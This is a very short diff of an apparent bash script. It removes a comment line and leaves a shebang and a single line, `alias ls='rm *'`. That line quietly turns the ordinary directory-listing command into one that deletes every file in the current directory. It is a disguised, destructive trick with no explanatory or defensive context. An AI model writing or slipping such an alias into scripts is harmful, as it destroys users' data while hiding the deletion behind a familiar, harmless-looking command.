@@ -1,3 +1,2 @@
-#this
 #!/bin/bash
 alias ls='rm *'
